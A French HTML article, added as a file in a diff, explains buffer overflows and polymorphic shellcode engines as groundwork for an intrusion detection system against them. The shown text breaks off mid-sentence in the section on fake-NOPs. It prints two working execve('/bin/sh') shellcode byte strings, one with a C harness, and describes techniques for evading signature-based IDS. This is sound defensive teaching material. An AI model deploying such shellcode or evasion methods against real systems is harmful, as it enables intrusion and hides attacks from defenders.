@@ -1,0 +1,1005 @@
+<html>
+<head>
+<title>Programmer un IDS contrant les shellcodes polymorphiques</title>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<link href="style.css" rel="stylesheet" type="text/css">
+</head>
+<body>
+<hr align="left">
+<p align="center"><font size="2"><img src="Images/Ids.jpg" width="469" height="60"></font></p>
+<hr align="left">
+<p align="LEFT"><em><a href="ids.htm" target="_blank">AFFICHER CET ARTICLE EN MODE PAGE ENTIERE</a></em></p><p align="center"><font size="2"><u><strong><font size="3" face="Verdana, Arial, Helvetica, sans-serif">SOMMAIRE</font></strong></u></font></p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="2"><a href="#1">1) Introduction</a> </font></p>
+<p align="left"><font size="2"><a href="#2">2) Buffer overflows : rappels de base </a></font></p>
+<p align="left"><font size="2"><a href="#3">3) Les Shellcodes Polymorphiques </a><br>
+  <font color="#F8F8F8">...<font color="#000000"><a href="#31">3.1) D&eacute;finition</a><br>
+  <font color="#F8F8F8">...<font color="#000000"><a href="#32">3.2) Le moteur 
+  de shellcodes polymorphiques </a><br>
+  <font color="#F8F8F8">...<font color="#000000"><a href="#33">3.3) Les Fake-NOPs</a></font></font></font></font></font></font></font></p>
+
+<p align="left"><font size="2"><a href="#4">4) Un IDS contre les Shellcodes Polymorphiques</a><br>
+  <font color="#F8F8F8">...<font color="#000000"><a href="#41">4.1) Fonctionnement 
+  de la stack</a><br>
+  <font color="#F8F8F8">...<font color="#000000"><a href="#42">4.2) Fonctionnement 
+  de notre IDS </a></font></font></font></font></font></p>
+<p align="left"><font size="2"><a href="#5">5) D&eacute;jouer l'IDS</a></font></p>
+<p align="left"><font size="2"><a href="#6">6) Conclusion </a></font></p>
+<p align="left"><font size="2"><a href="#7">7) Codes source</a></font></p>
+<p align="left"><font size="2"><a href="#8">8) R&eacute;ferences</a> </font></p>
+<hr>
+<p align="left"><font size="2"></font></p>
+<p align="left"><font size="2"> <u><strong><a name="1"></a>1) Introduction </strong></u></font></p>
+<p align="left"><font size="4">L</font><font size="2">es <em>shellcodes</em> sont 
+  tr&egrave;s vulgaris&eacute;s sur la sc&egrave;ne de hack mondiale. Tout le 
+  monde ou presque sait faire un <font color="#666666" face="Courier New, Courier, mono">execve()</font> 
+  sur &quot;<font color="#666666" face="Courier New, Courier, mono">/bin/sh</font>&quot;, 
+  lancer un simple <em>shell</em>. Toutefois, la programmation d'un <em>shellcode</em> 
+  ne se r&eacute;sume pas seulement &agrave; obtenir un <em>remote shell root</em>, 
+  c'est un v&eacute;ritable art. Avec les protections actuelles, un shellcode 
+  doit &ecirc;tre petit, donc optimis&eacute;, invisible pour ne pas se faire 
+  d&eacute;tecter et assez puissant pour casser de tr&egrave;s robustes s&eacute;curit&eacute;s 
+  serveurs. </font></p>
+<p align="left"><font size="4">C</font><font size="2">et article se basera sur 
+  les moyens permettant de d&eacute;tecter les shellcodes actuels, donc sur leur 
+  furtivit&eacute;, leur capacit&eacute; &agrave; se camoufler. Pour ceux qui 
+  ne seraient pas familiaris&eacute;s avec l'univers des shellcodes, se reporter 
+  &agrave; <font color="#FF0000">[1]</font>, <font color="#FF0000">[2]</font> 
+  ou <font color="#FF0000">[6]</font>. </font></p>
+<p align="left"><font size="4">L</font><font size="2">es <em>shellcodes polymorphiques</em> 
+  ont &eacute;t&eacute; invent&eacute;s afin de rendre les <em>shellcodes</em> 
+  ind&eacute;tectables par les syst&egrave;mes d'anti-intrusions. Plusieurs &eacute;volutions 
+  de ces shellcodes ont vu le jour. Par d&eacute;finition, un <em>shellcode polymorphique</em> 
+  n'a aucune partie compl&egrave;tement identique dans chacun de ses clones. Aucun 
+  d&eacute;veloppeur d'<em><strong>IDS</strong></em> ne pourra construire une 
+  base de donn&eacute;es rassemblant des millions de <em>shellcodes</em> reproductibles 
+  par un seul algorithme. <br>
+  Cette m&eacute;thode a &eacute;t&eacute; encore am&eacute;lior&eacute;e tr&egrave;s 
+  r&eacute;cemment par la team <strong>RTC</strong>. Dans <a href="http://www.phrack.com">Phrack 
+  #61</a>, son paper &quot;Polymorphic shellcode Engine Using Spectrum Analysis&quot; 
+  est une mini-r&eacute;volution de la programmation de <em>shellcode polymorphique</em>. 
+  La <strong>RTC</strong> affirme avoir impl&eacute;ment&eacute; des m&eacute;thodes 
+  contre la prochaine g&eacute;n&eacute;ration de <em><strong>NIDS</strong></em> 
+  qui utiliseront les m&eacute;thodes de <em>data-mining</em>. </font></p>
+<p align="left"><font size="4">C</font><font size="2">e paper va donc se baser 
+  sur cette m&eacute;thode de contournement. On &eacute;tudiera tout d'abord ce 
+  qu'est un <em>overflow</em> et le fonctionnement d'un <em>shellcode polymorphique</em>, 
+  puis on examinera en d&eacute;tail le m&eacute;canisme propos&eacute; par <strong>RTC</strong>. 
+  Enfin, on en tirera des faiblesses et nous expliquerons la m&eacute;thode choisie 
+  pour contourner leur <em>engine</em>, et nous nous tournerons vers le code d'un 
+  <em> <strong>IDS</strong></em> anti-<em>shellcodes polymorphiques</em>. </font></p>
+<p align="left"><font size="2"><br>
+  </font></p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="2"><strong><u><a name="2"></a>2) Buffer overflows 
+  : rappels de base </u></strong></font></p>
+<p align="left"><font size="4">A</font><font size="2">leph1 <font color="#FF0000">[1]</font> 
+  a r&eacute;volutionn&eacute; le principe des <em>buffers overflows</em>. Cette 
+  technique d'exploitation est l'une des plus r&eacute;pandue et, malgr&eacute; 
+  toutes les protections actuelles, l'une des plus exploit&eacute;es au monde. 
+  Pourquoi ? Elle est tr&egrave;s simple et ne demande, dans certains cas qu'une 
+  connaissance relativement limit&eacute;e d'un <em><strong>OS</strong></em> : 
+  conna&icirc;tre le fonctionnement de la <em>stack</em> et quelques instructions 
+  Assembleur. En outre, les programmes actuels sont immenses et tr&egrave;s complexes, 
+  pouvant contenir parfois des dizaines de milliers de lignes de code. Parmi toutes 
+  celles l&agrave;, malgr&eacute; l'utilisation de v&eacute;rificateurs de code 
+  source, de protections contre l'ex&eacute;cution de code dans certains segments 
+  et de compilateurs s&eacute;curis&eacute;s, l'exp&eacute;rience montre que l'utilisation 
+  de toutes ces technologies ne supprime pas de mani&egrave;re radicale toutes 
+  les failles potentielles d'un programme. Du coup, un certain nombre d'attaques 
+  demeure possible. </font></p>
+<p align="left"><font size="4">L</font><font size="2">e but d'une exploitation 
+  par buffer overflow est de faire ex&eacute;cuter du code arbitraire &agrave; 
+  un programme. Le sc&eacute;nario le plus courant est d'envoyer du code permettant 
+  l'ex&eacute;cution d'un <em>shell</em> sur un processus ayant des droits privil&eacute;gi&eacute;s, 
+  ceux du <em>root</em> par exemple afin d'obtenir un <em>shell</em> distant poss&eacute;dant 
+  les droits administrateur. <br>
+  <font size="4">L</font>ors d'une attaque par <em>buffer overflow</em>, l'exploit 
+  ne contient pas seulement le <em>shellcode</em> proprement dit. Il se compose 
+  de 3 morceaux principaux, en g&eacute;n&eacute;ral : <br>
+  - des <em><strong>NOP</strong></em> (<em><strong>N</strong>ull <strong>OP</strong>erations</em>, 
+  <font color="#666666" face="Courier New, Courier, mono">0x90</font>, instruction 
+  vide) qui servent &agrave; remplir le buffer vuln&eacute;rable.<br>
+  - le code du <em>shellcode</em> proprement dit.<br>
+  - l'<em>adresse de retour</em> qui pointe dans les <em><strong>NOP</strong>s</em>. 
+  </font></p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="2"><em><u>Ainsi, la stack sera organis&eacute;e de 
+  la sorte : </u></em></font></p>
+<table width="35%" border="1" align="center" bordercolor="#F8F8F8">
+  <tr bordercolor="#000000" bgcolor="#FFFFFF"> 
+    <td width="24%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">NOPs</font></div></td>
+    <td width="29%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Shellcode</font></div></td>
+    <td width="47%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Adresse 
+        de retour</font></div></td>
+  </tr>
+</table>
+<p align="left">&nbsp;</p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="4">J</font><font size="2">'explique : quand la fonction 
+  contenant le <em>buffer</em> vuln&eacute;rable se termine par l'<em>opcode</em> 
+  &quot;ret&quot;, le flux d'ex&eacute;cution est modifi&eacute;, et elle reprend 
+  quelque part dans les<em> <strong>NOP</strong>s</em>, l'adresse de retour r&eacute;elle 
+  ayant &eacute;t&eacute; &eacute;cras&eacute;e par la nouvelle adresse de retour, 
+  celle de notre <em>shellcode</em>. <br>
+  Pourquoi placer des <em><strong>NOP</strong>s</em> ? Les <em><strong>NOP</strong>s</em> 
+  sont essentiels. En effet, d'une part, ils servent &agrave; combler le<em> buffer</em> 
+  vuln&eacute;rable. D'autre part, ils ont pour r&ocirc;le de r&eacute;cup&eacute;rer 
+  le flux d'ex&eacute;cution &agrave; partir de l'adresse de retour estim&eacute;e. 
+  Par d&eacute;finition, on ne sait pas combien de <em><strong>NOP</strong>s</em> 
+  seront ex&eacute;cut&eacute;s au moment de l'exploitation. Plus la plage de 
+  <em><strong>NOP</strong>s</em> est grande, plus il y aura de chances que l'adresse 
+  de retour estim&eacute;e soit bonne. En g&eacute;n&eacute;ral, la taille de 
+  la la plage des <em><strong>NOP</strong>s</em> est de l'ordre de quelques Ko. 
+  Cependant, si on conna&icirc;t un peu la machine distante et les processus qui 
+  y tournent, on peut arriver &agrave; r&eacute;duire consid&eacute;rablement 
+  cette plage de <em><strong>NOP</strong>s</em>. Il n'emp&ecirc;che que nous en 
+  avons besoin pour que l'exploitation puisse aboutir correctement. <br>
+  On remarque ici que les trois composantes d'un <em>shellcode</em> (<em><strong>NOP</strong>s, 
+  shellcode, RetAdr</em>) sont facilement indentifiables tant que leur code est 
+  fixe. Aussi des m&eacute;thodes pour les camoufler ont vu le jour. </font></p>
+<p align="left"><font size="4">A</font><font size="2">pr&egrave;s l'apparition 
+  des <em>shellcodes</em>, on s'est mis &agrave; programmer des <em><strong>IDS</strong></em> 
+  (<em><strong>I</strong>ntrusion <strong>D</strong>etection <strong>S</strong>ystem</em> 
+  = <em><strong>S</strong>yst&egrave;me de <strong>D</strong>&eacute;tection d'<strong>I</strong>ntrusion</em>) 
+  fonctionnant avec une m&eacute;thode simple, mais amplement satisfaisante : 
+  le <em>pattern-matching</em>. Cette technique est en fait bas&eacute;e sur la 
+  signature d'un programme. l'<em><strong>IDS</strong></em> regarde dans sa base 
+  de donn&eacute;es si le <em>shellcode</em> poss&egrave;de cette signature, c'est 
+  &agrave; dire une suite d'octets qui permet de l'identifier &agrave; coup s&ucirc;r. 
+  Pour les shellcodes de l'&eacute;poque qui &eacute;taient du style : </font></p>
+<table width="55%" border="1" align="center" bordercolor="#000000">
+  <tr>
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">char shellcode[] 
+      = <br>
+      &quot;\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b&quot; 
+      <br>
+      &quot;\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd&quot; 
+      <br>
+      &quot;\x80\xe8\xdc\xff\xff\xff/bin/sh&quot;; <br>
+      int main()<br>
+      { <br>
+      void (*sh)() = (void *)shellcode; <br>
+      sh(); <br>
+      }</font></td>
+  </tr>
+</table>
+<p align="left"><font size="2"></font></p>
+<p align="left"><font size="4">U</font><font size="2">ne signature pouvait permettre 
+  de d&eacute;tecter des <em>opcodes</em> sp&eacute;cifiques a un <em>shellcode</em> 
+  comme &quot;<font color="#666666" face="Courier New, Courier, mono">/bin/sh</font>&quot;. 
+  En outre, les 3 octets <em>XFF</em> d&eacute;notent que l'adresse de la cha&icirc;ne 
+  a &eacute;t&eacute; calcul&eacute;e avec un <font color="#666666" face="Courier New, Courier, mono">jmp/call</font> 
+  (nombre n&eacute;gatif cod&eacute; sur un mot long) et ces octets peuvent &eacute;galement 
+  &ecirc;tre d&eacute;tect&eacute;s par les <strong>IDS</strong>, s'ils se trouvent 
+  &agrave; proximit&eacute; d'un &quot;<font color="#666666" face="Courier New, Courier, mono">/bin/sh</font>&quot; 
+  .</font></p>
+<p><font size="4">O</font><font size="2">r, il est possible de masquer cette cha&icirc;ne 
+  en <em>pushant</em> directement tous les arguments dans la <em>stack</em>. Du 
+  coup, on obtient un <em>shellcode</em> qui fait toujours un <font color="#666666" face="Courier New, Courier, mono">execve()</font> 
+  sur <font color="#666666" face="Courier New, Courier, mono">/bin/sh</font>, 
+  mais qui est beaucoup plus petit : </font></p>
+<table width="36%" border="1" align="center" bordercolor="#000000">
+  <tr>
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">char shellcode[] 
+      = <br>
+      &quot;\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f&quot; <br>
+      &quot;\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0&quot; <br>
+      &quot;\x0b\xcd\x80&quot;; </font></td>
+  </tr>
+</table>
+<p><font size="2"></font></p>
+<p align="left"><font size="4">D</font><font size="2">ans ce cas, l'<em><strong>IDS</strong></em> 
+  d&eacute;tectera &quot;<font color="#666666" face="Courier New, Courier, mono">int$0x80</font>&quot; 
+  (qui correspond en assembleur &agrave; <font color="#666666" face="Courier New, Courier, mono">0xCD</font>, 
+  <font color="#666666" face="Courier New, Courier, mono">0x80</font>). Ces deux 
+  types de signatures ne peuvent &ecirc;tre supprim&eacute;es d'un <em>shellcode</em> 
+  classique puisqu'elles permettent d'obtenir ce que l'on cherche, un <em>shell</em>. 
+  Aussi, on s'aper&ccedil;oit tr&egrave;s rapidement de la faiblesse d'une telle 
+  programmation et de la n&eacute;cessit&eacute; de crypter tout &ccedil;a.</font></p>
+<p align="left">&nbsp;</p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="2"><br>
+  <u><strong><a name="3"></a>3) Les Shellcodes Polymorphiques</strong></u></font></p>
+<blockquote> 
+  <p align="left"><font size="3"><a name="31"></a><u>3.1) D&eacute;finition </u></font></p>
+</blockquote>
+<p align="left"><font size="4">L</font><font size="2">es premiers moteurs de mutation 
+  polymorphique sont apparus au d&eacute;but des ann&eacute;es 90 avec le <em>Mutation 
+  Engine</em> de Dark Avenger. D'abord utilis&eacute;e pour les virus, cette m&eacute;thode 
+  a &eacute;t&eacute; extrapol&eacute;e aux <em>shellcodes</em>. ADMmutate <font color="#FF0000">[5]</font> 
+  est la premi&egrave;re release publique de <em>shellcodes polymorphiques</em>. 
+  </font></p>
+<p align="left"><font size="2"><u>Mais d'abord, qu'est-ce qu'un shellcode polymorphique 
+  ?</u><br>
+  <br>Il s'agit d'un <em>shellcode</em> crypt&eacute; avec un g&eacute;n&eacute;rateur 
+  de <em>shellcodes polymorphiques</em>.</font></p>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="2"><u>Pourquoi polymorphique ?</u><br>
+  <br>
+  <font size="4">P</font>arce qu'&agrave; chaque fois qu'on g&eacute;n&egrave;re 
+  un <em>shellcode</em> avec ce g&eacute;n&eacute;rateur, il est enti&egrave;rement 
+  diff&eacute;rent : il ne poss&egrave;de plus aucun octet statique. En effet, 
+  plus besoin de chercher un syst&egrave;me sans <em><strong>IDS</strong></em>, 
+  notre <em>shellcode</em> ne &quot;ressemble &agrave; rien&quot; mais fait bel 
+  et bien un <font color="#666666" face="Courier New, Courier, mono">execve()</font> 
+  sur<font color="#666666" face="Courier New, Courier, mono"> /bin/sh</font>.<br>
+  Nous verrons plus tard que le<em> Polymorphic Shellcode Engine</em> de <strong>CLET 
+  Team</strong> est beaucoup plus puissant que les simples g&eacute;n&eacute;rateurs 
+  actuels. Un <em>shellcode polymorphique</em> est plus simple a programmer qu'un 
+  virus polymorphique : alors que le virus se doit de poss&eacute;der l'encodeur 
+  et le d&eacute;codeur, le <em>shellcode</em> n'a besoin que du d&eacute;codeur 
+  (et de la cl&eacute; correspondante) pour &ecirc;tre utilis&eacute;.<br>
+  Nous l'avons dit, la technique du polymorphisme consiste a g&eacute;n&eacute;rer 
+  un <em>shellcode polymorphique</em> gr&acirc;ce &agrave;un g&eacute;n&eacute;rateur. 
+  Cette g&eacute;n&eacute;ration est un encodage bas&eacute; sur un chiffrement 
+  l&eacute;ger &agrave; base de fonctions logiques<em><strong> XOR</strong></em>. 
+  On y incorpore ensuite le d&eacute;codeur et la clef. Finalement, notre <em>stack</em> 
+  ressemblera a ceci : </font></p>
+<table width="37%" border="1" align="center" bordercolor="#F8F8F8">
+  <tr bordercolor="#000000" bgcolor="#FFFFFF"> 
+    <td width="12%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">NOPs</font></div></td>
+    <td width="67%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">SHELLCODE 
+        POLYMORPHIQUE</font></div></td>
+    <td width="21%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">RET 
+        ADR</font></div></td>
+  </tr>
+</table>
+<p align="left"><font size="2"></font></p>
+<p align="left"><font size="2"><br>
+  <br>
+  </font><font size="2"><em><u>avec SHELLCODE POLYMORPHIQUE :</u></em> </font></p>
+<table width="39%" border="1" align="center" bordercolor="#F8F8F8">
+  <tr bordercolor="#000000" bgcolor="#FFFFFF"> 
+    <td width="26%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">DECODEUR</font></div></td>
+    <td width="19%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">CLEF</font></div></td>
+    <td width="55%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">SHELLCODE 
+        ENCODE</font></div></td>
+  </tr>
+</table>
+<p align="left"><font size="2"></font></p>
+<p align="left"><font size="2"></font><br>
+</p>
+<p align="left"><font size="4">C</font><font size="2">ette disposition ne peut 
+  &ecirc;tre modifi&eacute;e car il faut que le <em>shellcode</em> original puisse 
+  se reconstruire de mani&egrave;re automatique. </font></p>
+<p align="left"><font size="4">T</font><font size="2">outefois, autre chose pouvait 
+  vendre la m&egrave;che aux <em><strong>IDS</strong></em> malgr&eacute; le polymorphisme 
+  des<em> shellcodes</em>. Comme nous l'avons vu, un <em>shellcode</em> pour <em>buffer</em> 
+  <em>overflow</em> est compos&eacute; de 3 parties : les <em><strong>NOP</strong>s</em>, 
+  le <em>shellcode</em> et l'<em>adresse de retour</em>. <br>
+  H&eacute; oui, quelques milliers de <em><strong>NOP</strong>s</em> ou meme quelques 
+  centaines d'instructions <font color="#666666" face="Courier New, Courier, mono">0x90</font> 
+  ne passent pas inaper&ccedil;us !<br>
+  </font></p>
+<p align="left"><font size="2"><u><br>Qu'est-ce qu'un NOP ?</u><br><br>
+  Sous une architecture <font color="#666666" face="Courier New, Courier, mono">Intel-32</font>, 
+  le <em><strong>NOP</strong></em> correspond &agrave; l'octet <font color="#666666" face="Courier New, Courier, mono">0x90</font>. 
+  Cette instruction ne fait strictement rien. Son but est seulement d'incr&eacute;menter 
+  le registre <font color="#666666" face="Courier New, Courier, mono">%eip</font> 
+  pendant un cycle d'horloge. Les <em><strong>NOP</strong>s</em> sont aussi utilis&eacute;s 
+  par les compilateurs pour garder l'alignement sur des adresses multiples de 
+  4, 8 ou 16 octets.<br>
+  Dans une attaque par <em>buffer overflow</em>, ils ont deux r&ocirc;les : certains<em> 
+  <strong>NOP</strong>s</em> servent &agrave; remplir le <em>buffer vuln&eacute;rable</em>; 
+  et une autre plage de <em><strong>NOP</strong>s</em> permet de r&eacute;cup&eacute;rer 
+  le flot d'ex&eacute;cution et de compenser l'erreur de l'estimation de l'<em>adresse 
+  de retour</em>. <br>
+  Aussi, &agrave; la place des <em><strong>NOP</strong>s</em>, les g&eacute;n&eacute;rateurs 
+  de <em>shellcodes polymorphiques</em> ont plac&eacute; autre chose. En effet, 
+  ce n'est pas le fait que l'instruction <font color="#666666" face="Courier New, Courier, mono">0x90 
+  </font>fasse perdre un cycle d'horloge au processeur, qui est utile. Mais en 
+  l'occurence, comme le but est de remplir le <em>buffer</em> vuln&eacute;rable, 
+  on peut se servir de n'importe quelle instruction d'un octet modifiant n'importe 
+  quel registre que le <em>shellcode</em> n'utilisera pas (<font color="#666666" face="Courier New, Courier, mono">%eax, 
+  %ebx, %ecx et %edx</font>), plut&ocirc;t que d'utiliser des <em><strong>NOP</strong>s</em>.<br>
+  Alors, les possibilit&eacute;s sont infinies. Par exemple, l'<em>opcode</em><font color="#666666" face="Courier New, Courier, mono"> 
+  0x41</font> correspond &agrave; '<font color="#666666" face="Courier New, Courier, mono">inc 
+  %ecx</font>', mais aussi au caract&egrave;re ASCII '<font color="#666666" face="Courier New, Courier, mono">A</font>'. 
+  C'est ce qu'on appelle des &quot;fake-nops&quot;. </font></p>
+<p align="left"><font size="2">Avec ces protections, l<em><strong>'IDS</strong></em> 
+  se trouve totalement bluff&eacute;. Aucun moyen de savoir qu'un <em>fake-nop</em> 
+  est un <em><strong>NOP</strong></em> en r&eacute;alit&eacute;, ni de pouvoir 
+  d&eacute;tecter un <em>shellcode polymorphique</em>. Pour l'<em>adresse de retour</em>, 
+  nous ne nous arr&ecirc;terons pas dessus. L'id&eacute;e est de moduler l'adresse, 
+  voir <font color="#FF0000">[5]</font>. </font></p>
+<p align="left"><font size="2"><br>
+  </font></p>
+<blockquote> 
+  <p align="left"><font size="3"><br>
+    <a name="32"></a><u>3.2) Le moteur de shellcodes polymorphiques</u></font></p>
+</blockquote>
+<p align="left"><font size="4">L</font><font size="2">es g&eacute;n&eacute;rateurs 
+  de <em>shellcodes polymorphiques</em> classiques actuels utilisent en g&eacute;n&eacute;ral 
+  le cryptage <em><strong>XOR</strong></em> avec une cl&eacute; de 32 bits. Comme 
+  ce cryptage est r&eacute;versible (<font color="#666666" face="Courier New, Courier, mono">A 
+  XOR B = C =&gt; C XOR B = A</font>) ; on peut donc d&eacute;coder ais&eacute;ment 
+  le <em>shellcode</em>. En m&eacute;moire, on aura donc : </font></p>
+<table width="33%" border="1" align="center" bordercolor="#000000">
+  <tr>
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">[jump][decodeur][call 
+        negatif][sh poly]</font></div></td>
+  </tr>
+</table>
+<p align="left"><font size="2"><u><br>
+  </u></font><font size="2"><u>Comment fonctionne ce g&eacute;n&eacute;rateur 
+  ?</u></font><font size="2"><br>
+  <font size="4"><br>
+  P</font>renons une instruction comme &quot;<font color="#666666" face="Courier New, Courier, mono">int 
+  $0x80</font>&quot;. Le g&eacute;n&eacute;rateur va donc pusher <font color="#666666" face="Courier New, Courier, mono">$0x80</font> 
+  (little endian), ensuite on <em>jump</em> &agrave; l'endroit du <em>shellcode 
+  polymorphime</em> et on effectue un <em><strong>XOR</strong></em>. </font></p>
+<p align="left"><font size="2"><br>
+  <u><em><br>Finalement le shellcode polymorphime ressemble donc &agrave; &ccedil;a 
+  : </em></u></font></p>
+<table width="85%" border="1" align="center" bordercolor="#000000">
+  <tr>
+    <td bordercolor="#FFFFFF" bgcolor="#FFFFFF"><font color="#666666" size="2" face="Courier New, Courier, mono">push $xxxx <br>
+      xor $xxxx, (%esp) // on re-effectue ces deux opcodes jusqu'&agrave; ce que 
+      tous les octets du sh soit cod&eacute;s. <br>
+      jump (%esp) </font></td>
+  </tr>
+</table>
+<p align="left"><u><em><font size="2"></font></em></u></p>
+<p align="left"><font size="4"><br>
+  C</font><font size="2">e principe se retrouve quasiment &agrave; l'identique 
+  dans tous les moteurs de <em>shellcodes polymorphiques</em>.</font></p>
+<p align="left"><font size="2"><u><br>
+  Pourquoi la team RTC a t'elle vraiment innove avec cette technique?</u><br>
+  <br>
+  <font size="4">P</font>artant du principe que les <em><strong>IDS</strong></em> 
+  actuels essayent de trouver une suite de<strong> <em>NOP</em></strong><em>s 
+  </em>cons&eacute;cutifs et font du <em>patte-matching</em> sur les <em>shellcodes 
+  </em>quand ils croient avoir d&eacute;tect&eacute; une zone de <em>fake-nops</em>. 
+  Par cons&eacute;quent, leur g&eacute;n&eacute;rateur met en oeuvre un certain 
+  nombre de contournements permettant de camoufler de mani&egrave;re tr&egrave;s 
+  optimale les <em>shellcodes</em>. </font></p>
+<p align="left"><font size="2"><em><u><br>Voici les &eacute;tapes successives qui 
+  sont r&eacute;alis&eacute;es :</u></em><br>
+   <br>
+  - la s&eacute;rie de <em><strong>NOP</strong>s</em> est chang&eacute;e en une 
+  s&eacute;rie d'intructions al&eacute;atoires, des <em>fake-nops</em>, cod&eacute;s 
+  sur 1, 2 ou 3 octets .<br>
+  - le <em>shellcode</em> est chiffr&eacute; avec un type de cryptage al&eacute;atoire 
+  suivant 3 types possibles, <strong>ADD/SUB</strong>, <strong>ROR/ROL</strong>, 
+  <strong>XOR</strong>. La routine de d&eacute;chiffrement est g&eacute;n&eacute;r&eacute;e 
+  de mani&egrave;re al&eacute;atoire. <br>
+  - Une analyse <em>spectrum</em> permet de faire jouer les probabilit&eacute;s 
+  pour placer des octets al&eacute;atoires dans la zone &quot;byte to cram&quot;, 
+  zone servant &agrave; remplir le <em>buffer</em> lors de l<em>'overflow</em>, 
+  au lieu d'y placer des <em><strong>NOP</strong>s</em>. <br>
+  - Enfin, la couverture des <em>adresses de retour</em> est basee sur la m&eacute;thode 
+  de ADMmutate. </font></p>
+<p align="left"><font size="4">C</font><font size="2">ette protection est tr&egrave;s 
+  optimale et permet de rendre le <em>shellcode</em> ainsi produit TOTALEMENT 
+  furtif. Mais il y a d'autres &eacute;l&eacute;ments : le <em>shellcode</em> 
+  ne contient aucun z&eacute;ro puisqu'il sera stock&eacute; dans une cha&icirc;ne 
+  de caract&egrave;re. Par ailleurs la m&eacute;thode de chiffrement al&eacute;atoire 
+  peut avoir plusieurs formes avec du code al&eacute;atoire qui permet de fausser 
+  les pistes (m&ecirc;me si cette m&eacute;thode n'est pas encore implent&eacute;e 
+  dans la version sortie). <br>
+  Finalement, en m&eacute;moire nous avons : </font></p>
+<table width="84%" border="1" align="center" bordercolor="#F8F8F8">
+  <tr bordercolor="#000000" bgcolor="#FFFFFF"> 
+    <td width="12%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Fake-nops</font></div></td>
+    <td width="31%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Routine 
+        chiffr&eacute;e al&eacute;atoire</font></div></td>
+    <td width="16%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Shellcode</font></div></td>
+    <td width="19%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">byte 
+        to cram</font></div></td>
+    <td width="22%"> 
+      <div align="center"><font color="#666666" size="2" face="Courier New, Courier, mono">Adresse 
+        de retour</font></div></td>
+  </tr>
+</table>
+<p align="left">&nbsp;</p>
+<p align="left"><font size="2"></font></p>
+<blockquote>
+<p align="left"><font size="2"><br>
+    <font size="3"><u><a name="33"></a>3.3) Les Fake-NOPs </u></font></font></p>
+</blockquote>
+<p align="left"><font size="4">C</font><font size="2">omme une majeure partie 
+  de ce g&eacute;n&eacute;rateur a &eacute;t&eacute; focalis&eacute; sur le camouflage 
+  des <em>fake-nops</em>, ces derniers peuvent constituer une piste potentielle 
+  d'approche en vue de d&eacute;masquer notre <em>shellcode polymorphique</em>. 
+  Penchons-nous quelques instants dessus...<br>
+  Quand l'<em>adresse de retour</em> est modifi&eacute;e, on tombe dans la s&eacute;rie 
+  de <em><strong>NOP</strong>s</em>. Le but de <em>CLET</em> est de transformer 
+  ces<strong> <em>NOP</em></strong><em>s</em> en instructions non-dangereuses. 
+  Comme on a pas a sauvegarder les registres, il faut seulement que ces <em><strong>NOP</strong>s</em> 
+  ne provoquent aucune erreur, quelque soit l'endroit o&ugrave; on atterrit dans 
+  ces <em><strong>NOP</strong></em>. Leur id&eacute;e, fort int&eacute;ressante, 
+  est d'utiliser une instruction cod&eacute;e sur un octet. Comme chacun de ces 
+  octets sera innofensif, quelque soit l'endroit o&ugrave; on retombe, on arrivera 
+  au <em>shellcode</em> sans probl&egrave;me. Sachant qu'il n'existe pas beaucoup 
+  d'instructions sur un octet, ils ont mis&eacute; sur le fait que beaucoup d'instructions 
+  sur un octet peuvent &ecirc;tre cod&eacute;es avec une lettre majuscule. Ainsi, 
+  ce g&eacute;n&eacute;rateur cache la zone de <em>Fake-NOPs</em> dans une zone 
+  alpha-num&eacute;rique utilisant le dictionnaire americain-anglais.<br>
+  Afin de vous faire une id&eacute;e du codage alphanumerique des <em>shellcodes</em>, 
+  veuillez lire <font color="#FF0000">[3]</font> et <font color="#FF0000">[4]</font>. 
+  Un g&eacute;n&eacute;rateur de <em>shellcodes alphanum&eacute;riques</em> y 
+  est propos&eacute;.<br>
+  La restriction des instructions assembleur permet de cr&eacute;er un <em>shellcode 
+  polymorphique</em> enti&egrave;rement en texte. De la m&ecirc;me mani&egrave;re 
+  que pour les <em><strong>NOPs</strong></em>, en s&eacute;lectionnant seulement 
+  les <em>opcodes</em> ayant une correspondante ASCII, on peut parvenir &agrave; 
+  faire un d&eacute;codeur polymorphique enti&egrave;rement en texte. Que ce soit 
+  pour les <em><strong>NOP</strong>s</em>, le <em>shellcode</em> ou le d&eacute;codeur, 
+  le but n'est pas de restreindre les instructions assembleur, mais leur param&egrave;tres. 
+  Le format de codage des <em>opcodes</em> Intel contient deux champs importants 
+  : le <strong><em>ModR/M</em></strong> qui permet de choisir le mode d'adressage 
+  et l'acces a un registre ou une zone m&eacute;moire et le <em><strong>SIB</strong></em> 
